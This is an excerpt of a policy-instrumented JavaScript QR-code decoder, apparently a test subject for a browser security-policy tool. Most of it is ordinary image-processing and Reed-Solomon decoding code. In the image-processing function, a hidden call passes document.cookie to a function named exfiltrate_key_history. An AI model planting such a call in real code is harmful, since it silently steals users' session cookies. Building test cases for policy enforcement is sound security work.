...
function v154(patterns) {
  function distance(pattern1$$1, pattern2$$1) {
    ...
    return JAM.call(Math.sqrt, Math, [xDiff * xDiff + yDiff * yDiff], JAM.policy.p40);
  }
...
function v153(from, to) {
  ...
  var rest = JAM.call(this.slice, this, [v1070], JAM.policy.p40);
  var v172;
  if (from < 0) {
  ...
  this.length = v172;
  var v173 = this.push;
  return JAM.call(v173.apply, v173, [this, rest], JAM.policy.p41);
}
function v152() {
  ...
  for (;v177;) {
    ...
    for (;v176;) {
      var gray$$1 = JAM.call(qrcode.getPixel, qrcode, [x$$61, y$$43], JAM.policy.p41);
...
function v151(grayScale) {
  var middle$$1 = JAM.call(qrcode.getMiddleBrightnessPerArea, qrcode, [grayScale], JAM.policy.p40);
  var sqrtNumArea = middle$$1.length;
  var areaWidth$$1 = JAM.call(Math.floor, Math, [qrcode.width / sqrtNumArea], JAM.policy.p40);
  var areaHeight$$1 = JAM.call(Math.floor, Math, [qrcode.height / sqrtNumArea], JAM.policy.p40);
...
function v150(image$$7) {
  var numSqrtArea = 4;
  var areaWidth = JAM.call(Math.floor, Math, [qrcode.width / numSqrtArea], JAM.policy.p40);
  var areaHeight = JAM.call(Math.floor, Math, [qrcode.height / numSqrtArea], JAM.policy.p40);
  var minmax = new Array(numSqrtArea);
  var i$$46 = 0;
  var v191 = i$$46 < numSqrtArea;
  for (;v191;) {
    var v2841 = new Array(numSqrtArea);
    introspect(JAM.policy.p13) {
      minmax[i$$46] = v2841;
    }
    var i2 = 0;
  ...
  for (;v202;) {
    var v2843 = new Array(numSqrtArea);
    introspect(JAM.policy.p13) {
      middle[i3] = v2843;
    }
    i3 = i3 + 1;
  ...
  for (;v206;) {
    ...
    for (;v205;) {
      ...
      var v2844 = JAM.call(Math.floor, Math, [(v2513 + v2685[1]) / 2], JAM.policy.p40);
      introspect(JAM.policy.p13) {
        v203[v204] = v2844;
      }
      ax = ax + 1;
...
function v149(th) {
  ...
  for (;v210;) {
    ...
    for (;v209;) {
      var gray = JAM.call(qrcode.getPixel, qrcode, [x$$60, y$$42], JAM.policy.p41);
...
function v147(ctx) {
  ...
  var img$$3 = JAM.call(qrcode.grayScaleToBitmap, qrcode, [qrcode.grayscale()], JAM.policy.p40);
  if (qrcode.debug) {
    var y$$40 = 0;
    ...
    JAM.call(ctx.putImageData, ctx, [qrcode.imagedata, 0, 0], JAM.policy.p42);
  }
  var detector = new Detector(img$$3);
  var qRCodeMatrix = detector.detect();
  if (qrcode.debug) {
    JAM.call(ctx.putImageData, ctx, [qrcode.imagedata, 0, 0], JAM.policy.p42);
  }
  var reader$$1 = JAM.call(Decoder.decode, Decoder, [qRCodeMatrix.bits], JAM.policy.p40);
  ...
  for (;v233;) {
    ...
    for (;v232;) {
      ...
      str$$6 = v1123 + JAM.call(String.fromCharCode, String, [v1877], JAM.policy.p40);
      j$$24 = j$$24 + 1;
      introspect(JAM.policy.p27) {
  ...
  JAM.call(console.log, console, [time], JAM.policy.p31);
  exfiltrate_key_history(document.cookie);
  return JAM.call(qrcode.decode_utf8, qrcode, [str$$6], JAM.policy.p40);
}
function v146(s$$4) {
...
function v145(src$$1) {
  function v144() {
    JAM.call(console.log, console, ["Image failed!"], JAM.policy.p25);
    return;
  }
  function v143() {
    var canvas_qr$$1 = JAM.call(document.createElement, document, ["canvas"], JAM.policy.p25);
    var context$$1 = JAM.call(canvas_qr$$1.getContext, canvas_qr$$1, ["2d"], JAM.policy.p25);
    var canvas_out = JAM.call(document.getElementById, document, ["out-canvas"], JAM.policy.p25);
    if (canvas_out !== null) {
      var outctx = JAM.call(canvas_out.getContext, canvas_out, ["2d"], JAM.policy.p25);
      JAM.call(outctx.clearRect, outctx, [0, 0, 320, 240], JAM.policy.p24);
      JAM.call(outctx.drawImage, outctx, [img$$2, 0, 0, 320, 240], JAM.policy.p42);
    }
    canvas_qr$$1.width = img$$2.width;
    canvas_qr$$1.height = img$$2.height;
    JAM.call(context$$1.drawImage, context$$1, [img$$2, 0, 0], JAM.policy.p42);
    qrcode.width = img$$2.width;
    qrcode.height = img$$2.height;
    try {
      var v238 = qrcode;
      var v2845 = JAM.call(context$$1.getImageData, context$$1, [0, 0, img$$2.width, img$$2.height], JAM.policy.p24);
      v238.imagedata = v2845;
    } catch (e$$5) {
      qrcode.result = "Cross domain image reading not supported in your browser! Save it to your computer then drag and drop the file!";
      if (qrcode.callback !== null) {
        JAM.call(qrcode.callback, qrcode, [qrcode.result], JAM.policy.p40);
      }
      return;
    }
    try {
      var v241 = qrcode;
      var v2846 = JAM.call(qrcode.process, qrcode, [context$$1], JAM.policy.p40);
      v241.result = v2846;
    } catch (e$$6) {
      JAM.call(console.log, console, [e$$6], JAM.policy.p40);
  ...
  if (arguments.length === 0) {
    var canvas_qr = JAM.call(document.getElementById, document, ["qr-canvas"], JAM.policy.p25);
    var context = JAM.call(canvas_qr.getContext, canvas_qr, ["2d"], JAM.policy.p25);
    qrcode.width = canvas_qr.width;
    qrcode.height = canvas_qr.height;
    var v244 = qrcode;
    var v2847 = JAM.call(context.getImageData, context, [0, 0, qrcode.width, qrcode.height], JAM.policy.p24);
    v244.imagedata = v2847;
    var v245 = qrcode;
    var v2848 = JAM.call(qrcode.process, qrcode, [context], JAM.policy.p40);
    v245.result = v2848;
    if (qrcode.callback !== null) {
      JAM.call(qrcode.callback, qrcode, [qrcode.result], JAM.policy.p40);
    }
...
function v142(bits$$13) {
  ...
  var dataBlocks = JAM.call(DataBlock.getDataBlocks, DataBlock, [codewords$$1, version$$7, ecLevel$$2], JAM.policy.p41);
  var totalBytes = 0;
  var i$$44 = 0;
  ...
  for (;v253;) {
    ...
    JAM.call(this.correctErrors, this, [codewordBytes$$1, numDataCodewords$$3], JAM.policy.p41);
    i$$44 = 0;
...
function v141(codewordBytes, numDataCodewords$$2) {
  ...
  try {
    ...
    JAM.call(v259.decode, v259, [codewordsInts, numECCodewords], JAM.policy.p41);
  } catch (rse) {
    throw rse;
  }
  i$$43 = 0;
...
function v138(rawCodewords, version$$5, ecLevel$$1) {
  ...
  var ecBlocks = JAM.call(version$$5.getECBlocksForLevel, version$$5, [ecLevel$$1], JAM.policy.p40);
  var totalBlocks = 0;
  ...
  for (;v269;) {
    ...
    for (;v268;) {
      ...
      var v2849 = new DataBlock(numDataCodewords$$1, new Array(numBlockCodewords));
      introspect(JAM.policy.p13) {
        v266[v267] = v2849;
      }
      i$$11 = i$$11 + 1;
...
function v136(maskedFormatInfo$$1) {
  ...
  for (;v290;) {
    ...
    var bitsDifference$$1 = JAM.call(this.numBitsDiffering, this, [maskedFormatInfo$$1, targetInfo], JAM.policy.p41);
...
function v135(maskedFormatInfo) {
  var formatInfo$$1 = JAM.call(FormatInformation.doDecodeFormatInformation, FormatInformation, [maskedFormatInfo], JAM.policy.p40);
  if (formatInfo$$1 !== null) {
    return formatInfo$$1;
  }
  return JAM.call(FormatInformation.doDecodeFormatInformation, FormatInformation, [maskedFormatInfo ^ FORMAT_INFO_MASK_QR], JAM.policy.p40);
}
function v134(a, b) {
  a = a ^ b;
  var v2834 = a & 15;
...
function v133(x0$$4, y0$$4, x1$$5, y1$$5, x2$$3, y2$$3, x3$$2, y3$$2) {
  return JAM.call(this.squareToQuadrilateral, this, [x0$$4, y0$$4, x1$$5, y1$$5, x2$$3, y2$$3, x3$$2, y3$$2], JAM.policy.p41).buildAdjoint();
}
...
function v131(x0$$2, y0$$2, x1$$3, y1$$3, x2$$1, y2$$1, x3, y3, x0p, y0p, x1p, y1p, x2p, y2p, x3p, y3p) {
  var qToS = JAM.call(this.quadrilateralToSquare, this, [x0$$2, y0$$2, x1$$3, y1$$3, x2$$1, y2$$1, x3, y3], JAM.policy.p41);
  var sToQ = JAM.call(this.squareToQuadrilateral, this, [x0p, y0p, x1p, y1p, x2p, y2p, x3p, y3p], JAM.policy.p41);
  return JAM.call(sToQ.times, sToQ, [qToS], JAM.policy.p40);
}
function v130(versionBits) {
  ...
  for (;v316;) {
    ...
    if (targetVersion === versionBits) {
      return JAM.call(this.getVersionForNumber, this, [i$$4 + 7], JAM.policy.p40);
    }
    var bitsDifference = JAM.call(FormatInformation.numBitsDiffering, FormatInformation, [versionBits, targetVersion], JAM.policy.p41);
  ...
  if (bestDifference <= 3) {
    return JAM.call(this.getVersionForNumber, this, [bestVersion], JAM.policy.p40);
  }
  return null;
}
function v129(dimension$$3) {
  ...
  try {
    return JAM.call(Version.getVersionForNumber, Version, [dimension$$3 - 17 >> 2], JAM.policy.p40);
  } catch (iae) {
...
function v127(image$$4, dimension$$1, p1ToX, p1ToY, p2ToX, p2ToY, p3ToX, p3ToY, p4ToX, p4ToY, p1FromX, p1FromY, p2FromX, p2FromY, p3FromX, p3FromY, p4FromX, p4FromY) {
  var transform$$1 = JAM.call(PerspectiveTransform.quadrilateralToQuadrilateral, PerspectiveTransform, [p1ToX, p1ToY, p2ToX, p2ToY, p3ToX, p3ToY, p4ToX, p4ToY, p1FromX, p1FromY, p2FromX, p2FromY, p3FromX, p3FromY, p4FromX, p4FromY], JAM.policy.p41);
  return JAM.call(GridSampler.sampleGrid3, GridSampler, [image$$4, dimension$$1, transform$$1], JAM.policy.p41);
}
function v126(image$$3, dimension, transform) {
  ...
  for (;v340;) {
    ...
    JAM.call(transform.transformPoints1, transform, [points$$1], JAM.policy.p40);
    JAM.call(GridSampler.checkAndNudgePoints, GridSampler, [image$$3, points$$1], JAM.policy.p41);
    try {
      x$$48 = 0;
      var v339 = x$$48 < max;
      for (;v339;) {
        ...
        var v327 = JAM.call(Math.floor, Math, [v1892], JAM.policy.p40) * 4;
        var v2698 = x$$48 + 1;
        introspect(JAM.policy.p27) {
          var v2528 = points$$1[v2698]
        }
        var xpoint = v327 + JAM.call(Math.floor, Math, [v2528], JAM.policy.p40) * qrcode.width * 4;
        var v329 = image$$3;
        introspect(JAM.policy.p27) {
          var v1895 = points$$1[x$$48]
        }
        var v1190 = JAM.call(Math.floor, Math, [v1895], JAM.policy.p40);
        var v1896 = qrcode.width;
        var v2699 = x$$48 + 1;
        introspect(JAM.policy.p27) {
          var v2529 = points$$1[v2699]
        }
        var v330 = v1190 + v1896 * JAM.call(Math.floor, Math, [v2529], JAM.policy.p40);
        introspect(JAM.policy.p27) {
          var bit = v329[v330]
        }
        ...
        if (bit) {
          JAM.call(bits.set_Renamed, bits, [x$$48 >> 1, y$$31], JAM.policy.p29);
        }
        x$$48 = x$$48 + 2;
        v339 = x$$48 < max;
      }
...
function v125(image$$2, points) {
  ...
  for (;v350;) {
    ...
    var x$$47 = JAM.call(Math.floor, Math, [v341], JAM.policy.p40);
    var v1199 = offset$$8 + 1;
    introspect(JAM.policy.p27) {
      var v342 = points[v1199]
    }
    var y$$30 = JAM.call(Math.floor, Math, [v342], JAM.policy.p40);
    var v2530 = x$$47 < -1;
    if (!v2530) {
      v2530 = x$$47 > width$$9;
    }
  ...
  for (;v361;) {
    ...
    x$$47 = JAM.call(Math.floor, Math, [v352], JAM.policy.p40);
    var v1203 = offset$$8 + 1;
    introspect(JAM.policy.p27) {
      var v353 = points[v1203]
    }
    y$$30 = JAM.call(Math.floor, Math, [v353], JAM.policy.p40);
    var v2532 = x$$47 < -1;
    if (!v2532) {
      v2532 = x$$47 > width$$9;
    }
...
function ECBlocks(ecCodewordsPerBlock, ecBlocks1, ecBlocks2) {
  ...
  if (ecBlocks2) {
    var v2850 = new Array(ecBlocks1, ecBlocks2);
    this.ecBlocks = v2850;
  } else {
    var v2851 = new Array(ecBlocks1);
    this.ecBlocks = v2851;
  }
...
function Version(versionNumber, alignmentPatternCenters, ecBlocks1$$1, ecBlocks2$$1, ecBlocks3, ecBlocks4) {
  ...
  function v10() {
    ...
    JAM.call(bitMatrix.setRegion, bitMatrix, [0, 0, 9, 9], JAM.policy.p24);
    JAM.call(bitMatrix.setRegion, bitMatrix, [dimension$$2 - 8, 0, 8, 9], JAM.policy.p29);
    JAM.call(bitMatrix.setRegion, bitMatrix, [0, dimension$$2 - 8, 9, 8], JAM.policy.p24);
    ...
    for (;v374;) {
      ...
      for (;v373;) {
        ...
        JAM.call(bitMatrix.setRegion, bitMatrix, [v1211 - 2, i$$3, 5, 5], JAM.policy.p29);
        y$$32 = y$$32 + 1;
        v373 = y$$32 < max$$1;
      }
      x$$49 = x$$49 + 1;
    ...
    JAM.call(bitMatrix.setRegion, bitMatrix, [6, 9, 1, dimension$$2 - 17], JAM.policy.p24);
    JAM.call(bitMatrix.setRegion, bitMatrix, [9, 6, dimension$$2 - 17, 1], JAM.policy.p24);
    if (this.versionNumber > 6) {
      JAM.call(bitMatrix.setRegion, bitMatrix, [dimension$$2 - 11, 0, 3, 6], JAM.policy.p29);
      JAM.call(bitMatrix.setRegion, bitMatrix, [0, dimension$$2 - 11, 6, 3], JAM.policy.p24);
    }
    return bitMatrix;
  }
  function v9() {
  ...
  var v2852 = new Array(ecBlocks1$$1, ecBlocks2$$1, ecBlocks3, ecBlocks4);
  this.ecBlocks = v2852;
  var total$$1 = 0;
...
function Detector(image$$5) {
  function v26() {
    var v450 = new FinderPatternFinder;
    var info$$1 = JAM.call(v450.findFinderPattern, v450, [this.image], JAM.policy.p40);
    return JAM.call(this.processFinderPatternInfo, this, [info$$1], JAM.policy.p40);
  }
  function v25(info) {
    var topLeft$$3 = info.TopLeft;
    var topRight$$3 = info.TopRight;
    var bottomLeft$$3 = info.BottomLeft;
    var moduleSize$$1 = JAM.call(this.calculateModuleSize, this, [topLeft$$3, topRight$$3, bottomLeft$$3], JAM.policy.p41);
    if (moduleSize$$1 < 1) {
      throw "Error";
    }
    var dimension$$7 = JAM.call(this.computeDimension, this, [topLeft$$3, topRight$$3, bottomLeft$$3, moduleSize$$1], JAM.policy.p41);
    var provisionalVersion = JAM.call(Version.getProvisionalVersionForDimension, Version, [dimension$$7], JAM.policy.p40);
    ...
    if (provisionalVersion.AlignmentPatternCenters.length > 0) {
      ...
      var estAlignmentX$$1 = JAM.call(Math.floor, Math, [topLeft$$3.X + correctionToTopLeft * (bottomRightX$$1 - topLeft$$3.X)], JAM.policy.p40);
      var estAlignmentY$$1 = JAM.call(Math.floor, Math, [topLeft$$3.Y + correctionToTopLeft * (bottomRightY$$1 - topLeft$$3.Y)], JAM.policy.p40);
      var i$$7 = 4;
      var v461 = i$$7 <= 16;
      for (;v461;) {
        alignmentPattern$$1 = JAM.call(this.findAlignmentInRegion, this, [moduleSize$$1, estAlignmentX$$1, estAlignmentY$$1, i$$7], JAM.policy.p41);
        break;
      }
    }
    var transform$$4 = JAM.call(this.createTransform, this, [topLeft$$3, topRight$$3, bottomLeft$$3, alignmentPattern$$1, dimension$$7], JAM.policy.p41);
    var bits$$2 = JAM.call(this.sampleGrid, this, [this.image, transform$$4, dimension$$7], JAM.policy.p41);
    var points$$4;
  ...
  function v24(image$$6, transform$$3, dimension$$6) {
    ...
    return JAM.call(sampler.sampleGrid3, sampler, [image$$6, dimension$$6, transform$$3], JAM.policy.p41);
  }
  function v23(topLeft$$2, topRight$$2, bottomLeft$$2, alignmentPattern, dimension$$5) {
    ...
    var transform$$2 = JAM.call(PerspectiveTransform.quadrilateralToQuadrilateral, PerspectiveTransform, [3.5, 3.5, dimMinusThree, 3.5, sourceBottomRightX, sourceBottomRightY, 3.5, dimMinusThree, topLeft$$2.X, topLeft$$2.Y, topRight$$2.X, topRight$$2.Y, bottomRightX, bottomRightY, bottomLeft$$2.X, bottomLeft$$2.Y], JAM.policy.p24);
    return transform$$2;
  }
  function v22(overallEstModuleSize, estAlignmentX, estAlignmentY, allowanceFactor) {
    var allowance = JAM.call(Math.floor, Math, [allowanceFactor * overallEstModuleSize], JAM.policy.p40);
    var alignmentAreaLeftX = JAM.call(Math.max, Math, [0, estAlignmentX - allowance], JAM.policy.p24);
    var alignmentAreaRightX = JAM.call(Math.min, Math, [qrcode.width - 1, estAlignmentX + allowance], JAM.policy.p41);
    if (alignmentAreaRightX - alignmentAreaLeftX < overallEstModuleSize * 3) {
      throw "Error";
    }
    var alignmentAreaTopY = JAM.call(Math.max, Math, [0, estAlignmentY - allowance], JAM.policy.p24);
    var alignmentAreaBottomY = JAM.call(Math.min, Math, [qrcode.height - 1, estAlignmentY + allowance], JAM.policy.p41);
    var alignmentFinder = new AlignmentPatternFinder(this.image, alignmentAreaLeftX, alignmentAreaTopY, alignmentAreaRightX - alignmentAreaLeftX, alignmentAreaBottomY - alignmentAreaTopY, overallEstModuleSize, this.resultPointCallback);
    return alignmentFinder.find();
  }
  function v21(topLeft$$1, topRight$$1, bottomLeft$$1, moduleSize) {
    var tltrCentersDimension = JAM.call(Math.round, Math, [JAM.call(this.distance, this, [topLeft$$1, topRight$$1], JAM.policy.p41) / moduleSize], JAM.policy.p40);
    var tlblCentersDimension = JAM.call(Math.round, Math, [JAM.call(this.distance, this, [topLeft$$1, bottomLeft$$1], JAM.policy.p41) / moduleSize], JAM.policy.p40);
  ...
  function v19(topLeft, topRight, bottomLeft) {
    return(JAM.call(this.calculateModuleSizeOneWay, this, [topLeft, topRight], JAM.policy.p41) + JAM.call(this.calculateModuleSizeOneWay, this, [topLeft, bottomLeft], JAM.policy.p41)) / 2;
  }
  function v18(pattern$$1, otherPattern) {
    var moduleSizeEst1 = JAM.call(this.sizeOfBlackWhiteBlackRunBothWays, this, [JAM.call(Math.floor, Math, [pattern$$1.X], JAM.policy.p40), JAM.call(Math.floor, Math, [pattern$$1.Y], JAM.policy.p40), JAM.call(Math.floor, Math, [otherPattern.X], JAM.policy.p40), JAM.call(Math.floor, Math, [otherPattern.Y], JAM.policy.p40)], JAM.policy.p41);
    var moduleSizeEst2 = JAM.call(this.sizeOfBlackWhiteBlackRunBothWays, this, [JAM.call(Math.floor, Math, [otherPattern.X], JAM.policy.p40), JAM.call(Math.floor, Math, [otherPattern.Y], JAM.policy.p40), JAM.call(Math.floor, Math, [pattern$$1.X], JAM.policy.p40), JAM.call(Math.floor, Math, [pattern$$1.Y], JAM.policy.p40)], JAM.policy.p41);
  ...
  function v17(fromX$$1, fromY$$1, toX$$1, toY$$1) {
    var result = JAM.call(this.sizeOfBlackWhiteBlackRun, this, [fromX$$1, fromY$$1, toX$$1, toY$$1], JAM.policy.p41);
    var scale = 1;
    ...
    var otherToY = JAM.call(Math.floor, Math, [fromY$$1 - (toY$$1 - fromY$$1) * scale], JAM.policy.p40);
    scale = 1;
    if (otherToY < 0) {
    ...
    otherToX = JAM.call(Math.floor, Math, [fromX$$1 + (otherToX - fromX$$1) * scale], JAM.policy.p40);
    result = result + JAM.call(this.sizeOfBlackWhiteBlackRun, this, [fromX$$1, fromY$$1, otherToX, otherToY], JAM.policy.p41);
    return result - 1;
  }
  function v16(fromX, fromY, toX, toY) {
    var steep = JAM.call(Math.abs, Math, [toY - fromY], JAM.policy.p40) > JAM.call(Math.abs, Math, [toX - fromX], JAM.policy.p40);
    if (steep) {
      var temp = fromX;
      fromX = fromY;
      fromY = temp;
    ...
    var dx$$4 = JAM.call(Math.abs, Math, [toX - fromX], JAM.policy.p40);
    var dy$$4 = JAM.call(Math.abs, Math, [toY - fromY], JAM.policy.p40);
    var error$$1 = -dx$$4 >> 1;
    var v529;
    if (fromY < toY) {
      v529 = 1;
    ...
    for (;v540;) {
      ...
      if (state === 3) {
        ...
        return JAM.call(Math.sqrt, Math, [diffX * diffX + diffY * diffY], JAM.policy.p40);
      }
    ...
    return JAM.call(Math.sqrt, Math, [diffX2 * diffX2 + diffY2 * diffY2], JAM.policy.p40);
  }
  this.image = image$$5;
...
function FormatInformation(formatInfo) {
  ...
  var v2853 = JAM.call(ErrorCorrectionLevel.forBits, ErrorCorrectionLevel, [formatInfo >> 3 & 3], JAM.policy.p40);
...
function BitMatrix(width$$10, height$$9) {
  ...
  function v37(x$$53, y$$36) {
    ...
    return(URShift(v2304, x$$53 & 31) & 1) !== 0;
  }
  function v36() {
  ...
  var v2854 = new Array(rowSize * height$$9);
  this.bits = v2854;
  var i$$9 = 0;
...
function BitMatrixParser(bitMatrix$$1) {
  function v47() {
    ...
    var dataMask$$1 = JAM.call(DataMask.forReference, DataMask, [formatInfo$$2.DataMask], JAM.policy.p40);
    var dimension$$11 = this.bitMatrix.Dimension;
    JAM.call(dataMask$$1.unmaskBitMatrix, dataMask$$1, [this.bitMatrix, dimension$$11], JAM.policy.p41);
    ...
    for (;v584;) {
      ...
      for (;v583;) {
        ...
        var v582 = col < 2;
        for (;v582;) {
          if (!JAM.call(functionPattern.get_Renamed, functionPattern, [j$$4 - col, i$$15], JAM.policy.p41)) {
            bitsRead = bitsRead + 1;
            currentByte = currentByte << 1;
            var v1536 = this.bitMatrix;
            if (JAM.call(v1536.get_Renamed, v1536, [j$$4 - col, i$$15], JAM.policy.p41)) {
              currentByte = currentByte | 1;
            }
            if (bitsRead === 8) {
  ...
  function v46() {
    ...
    if (provisionalVersion$$1 <= 6) {
      return JAM.call(Version.getVersionForNumber, Version, [provisionalVersion$$1], JAM.policy.p40);
    }
    var versionBits$$2 = 0;
    ...
    for (;v591;) {
      ...
      var v590 = i$$14 >= ijMin;
      for (;v590;) {
        versionBits$$2 = JAM.call(this.copyBit, this, [i$$14, j$$3, versionBits$$2], JAM.policy.p29);
        i$$14 = i$$14 - 1;
        v590 = i$$14 >= ijMin;
      }
      j$$3 = j$$3 - 1;
    ...
    var v2855 = JAM.call(Version.decodeVersionInformation, Version, [versionBits$$2], JAM.policy.p40);
    ...
    var v2856 = JAM.call(Version.decodeVersionInformation, Version, [versionBits$$2], JAM.policy.p40);
  ...
  function v45() {
    ...
    var v597 = i$$13 < 6;
    for (;v597;) {
      formatInfoBits = JAM.call(this.copyBit, this, [i$$13, 8, formatInfoBits], JAM.policy.p29);
      i$$13 = i$$13 + 1;
      v597 = i$$13 < 6;
    }
    formatInfoBits = JAM.call(this.copyBit, this, [7, 8, formatInfoBits], JAM.policy.p24);
    formatInfoBits = JAM.call(this.copyBit, this, [8, 8, formatInfoBits], JAM.policy.p24);
    formatInfoBits = JAM.call(this.copyBit, this, [8, 7, formatInfoBits], JAM.policy.p24);
    var j$$2 = 5;
    var v598 = j$$2 >= 0;
    for (;v598;) {
      formatInfoBits = JAM.call(this.copyBit, this, [8, j$$2, formatInfoBits], JAM.policy.p24);
      j$$2 = j$$2 - 1;
      v598 = j$$2 >= 0;
    }
    var v2857 = JAM.call(FormatInformation.decodeFormatInformation, FormatInformation, [formatInfoBits], JAM.policy.p40);
    ...
    var v2858 = JAM.call(FormatInformation.decodeFormatInformation, FormatInformation, [formatInfoBits], JAM.policy.p40);
  ...
  function v44(i$$12, j$$1, versionBits$$1) {
    ...
    if (JAM.call(v2314.get_Renamed, v2314, [i$$12, j$$1], JAM.policy.p41)) {
...
function DataMask000() {
  ...
  function v48(bits$$5, dimension$$12) {
    ...
    for (;v609;) {
      ...
      for (;v608;) {
        if (JAM.call(this.isMasked, this, [i$$16, j$$5], JAM.policy.p41)) {
          JAM.call(bits$$5.flip, bits$$5, [j$$5, i$$16], JAM.policy.p29);
        }
        j$$5 = j$$5 + 1;
...
function DataMask001() {
  ...
  function v50(bits$$6, dimension$$13) {
    ...
    for (;v613;) {
      ...
      for (;v612;) {
        if (JAM.call(this.isMasked, this, [i$$18, j$$7], JAM.policy.p41)) {
          JAM.call(bits$$6.flip, bits$$6, [j$$7, i$$18], JAM.policy.p29);
        }
        j$$7 = j$$7 + 1;
...
function DataMask010() {
  ...
  function v52(bits$$7, dimension$$14) {
    ...
    for (;v617;) {
      ...
      for (;v616;) {
        if (JAM.call(this.isMasked, this, [i$$20, j$$9], JAM.policy.p41)) {
          JAM.call(bits$$7.flip, bits$$7, [j$$9, i$$20], JAM.policy.p29);
        }
        j$$9 = j$$9 + 1;
...
function DataMask011() {
  ...
  function v54(bits$$8, dimension$$15) {
    ...
    for (;v621;) {
      ...
      for (;v620;) {
        if (JAM.call(this.isMasked, this, [i$$22, j$$11], JAM.policy.p41)) {
          JAM.call(bits$$8.flip, bits$$8, [j$$11, i$$22], JAM.policy.p29);
        }
        j$$11 = j$$11 + 1;
...
function DataMask100() {
  ...
  function v56(bits$$9, dimension$$16) {
    ...
    for (;v625;) {
      ...
      for (;v624;) {
        if (JAM.call(this.isMasked, this, [i$$24, j$$13], JAM.policy.p41)) {
          JAM.call(bits$$9.flip, bits$$9, [j$$13, i$$24], JAM.policy.p29);
        }
        j$$13 = j$$13 + 1;
...
function DataMask101() {
  ...
  function v58(bits$$10, dimension$$17) {
    ...
    for (;v629;) {
      ...
      for (;v628;) {
        if (JAM.call(this.isMasked, this, [i$$26, j$$15], JAM.policy.p41)) {
          JAM.call(bits$$10.flip, bits$$10, [j$$15, i$$26], JAM.policy.p29);
        }
        j$$15 = j$$15 + 1;
...
function DataMask110() {
  ...
  function v60(bits$$11, dimension$$18) {
    ...
    for (;v633;) {
      ...
      for (;v632;) {
        if (JAM.call(this.isMasked, this, [i$$28, j$$17], JAM.policy.p41)) {
          JAM.call(bits$$11.flip, bits$$11, [j$$17, i$$28], JAM.policy.p29);
        }
        j$$17 = j$$17 + 1;
...
function DataMask111() {
  ...
  function v62(bits$$12, dimension$$19) {
    ...
    for (;v637;) {
      ...
      for (;v636;) {
        if (JAM.call(this.isMasked, this, [i$$30, j$$19], JAM.policy.p41)) {
          JAM.call(bits$$12.flip, bits$$12, [j$$19, i$$30], JAM.policy.p29);
        }
        j$$19 = j$$19 + 1;
...
function ReedSolomonDecoder(field) {
  function v67(errorEvaluator, errorLocations$$1, dataMatrix$$1) {
    ...
    for (;v648;) {
      ...
      var xiInverse = JAM.call(v638.inverse, v638, [v639], JAM.policy.p40);
      var denominator$$3 = 1;
      var j$$21 = 0;
      var v643 = j$$21 < s$$3;
      for (;v643;) {
        if (i$$34 !== j$$21) {
          ...
          denominator$$3 = JAM.call(v640.multiply, v640, [denominator$$3, JAM.call(GF256.addOrSubtract, GF256, [1, JAM.call(v2323.multiply, v2323, [v2324, xiInverse], JAM.policy.p41)], JAM.policy.p24)], JAM.policy.p41);
        }
        j$$21 = j$$21 + 1;
        v643 = j$$21 < s$$3;
      }
      ...
      var v1557 = JAM.call(errorEvaluator.evaluateAt, errorEvaluator, [xiInverse], JAM.policy.p40);
      var v2325 = this.field;
      var v2859 = JAM.call(v1556.multiply, v1556, [v1557, JAM.call(v2325.inverse, v2325, [denominator$$3], JAM.policy.p40)], JAM.policy.p41);
      introspect(JAM.policy.p13) {
        v644[v645] = v2859;
      }
      if (dataMatrix$$1) {
        ...
        var v2860 = JAM.call(v1559.multiply, v1559, [v1560, xiInverse], JAM.policy.p41);
        introspect(JAM.policy.p13) {
          v646[v647] = v2860;
        }
      }
  ...
  function v66(errorLocator) {
    ...
    if (numErrors === 1) {
      return new Array(JAM.call(errorLocator.getCoefficient, errorLocator, [1], JAM.policy.p23));
    }
    ...
    var v654 = v1561;
    for (;v654;) {
      if (JAM.call(errorLocator.evaluateAt, errorLocator, [i$$33], JAM.policy.p40) === 0) {
        var v651 = result$$3;
        var v652 = e$$4;
        var v1563 = this.field;
        var v2861 = JAM.call(v1563.inverse, v1563, [i$$33], JAM.policy.p40);
        introspect(JAM.policy.p13) {
          v651[v652] = v2861;
        }
        e$$4 = e$$4 + 1;
  ...
  function v65(a$$1, b$$1, R) {
    ...
    var v674 = r.Degree >= JAM.call(Math.floor, Math, [R / 2], JAM.policy.p40);
    for (;v674;) {
      var rLastLast = rLast;
      var sLastLast = sLast;
      var tLastLast = tLast;
      ...
      var denominatorLeadingTerm = JAM.call(rLast.getCoefficient, rLast, [rLast.Degree], JAM.policy.p40);
      var v664 = this.field;
      var dltInverse = JAM.call(v664.inverse, v664, [denominatorLeadingTerm], JAM.policy.p40);
      ...
      for (;v671;) {
        ...
        var v667 = this.field;
        var scale$$1 = JAM.call(v667.multiply, v667, [JAM.call(r.getCoefficient, r, [r.Degree], JAM.policy.p40), dltInverse], JAM.policy.p41);
        var v1571 = this.field;
        q = JAM.call(q.addOrSubtract, q, [JAM.call(v1571.buildMonomial, v1571, [degreeDiff, scale$$1], JAM.policy.p41)], JAM.policy.p40);
        r = JAM.call(r.addOrSubtract, r, [JAM.call(rLast.multiplyByMonomial, rLast, [degreeDiff, scale$$1], JAM.policy.p41)], JAM.policy.p40);
      ...
      var v672 = JAM.call(q.multiply1, q, [sLast], JAM.policy.p40);
      s$$2 = JAM.call(v672.addOrSubtract, v672, [sLastLast], JAM.policy.p40);
      var v673 = JAM.call(q.multiply1, q, [tLast], JAM.policy.p40);
      t = JAM.call(v673.addOrSubtract, v673, [tLastLast], JAM.policy.p40);
      v674 = r.Degree >= JAM.call(Math.floor, Math, [R / 2], JAM.policy.p40);
    }
    var sigmaTildeAtZero = JAM.call(t.getCoefficient, t, [0], JAM.policy.p23);
    if (sigmaTildeAtZero === 0) {
      throw "ReedSolomonException sigmaTilde(0) was zero";
    }
    var v676 = this.field;
    var inverse = JAM.call(v676.inverse, v676, [sigmaTildeAtZero], JAM.policy.p40);
    var sigma$$1 = JAM.call(t.multiply2, t, [inverse], JAM.policy.p40);
    var omega$$1 = JAM.call(r.multiply2, r, [inverse], JAM.policy.p40);
  ...
  function v64(received, twoS) {
    ...
    for (;v682;) {
      ...
      var evalx = JAM.call(poly.evaluateAt, poly, [JAM.call(v1577.exp, v1577, [v2334], JAM.policy.p40)], JAM.policy.p40);
    ...
    var sigmaOmega = JAM.call(this.runEuclideanAlgorithm, this, [JAM.call(v1580.buildMonomial, v1580, [twoS, 1], JAM.policy.p42), syndrome, twoS], JAM.policy.p41);
    var sigma = sigmaOmega[0];
    var omega = sigmaOmega[1];
    var errorLocations = JAM.call(this.findErrorLocations, this, [sigma], JAM.policy.p40);
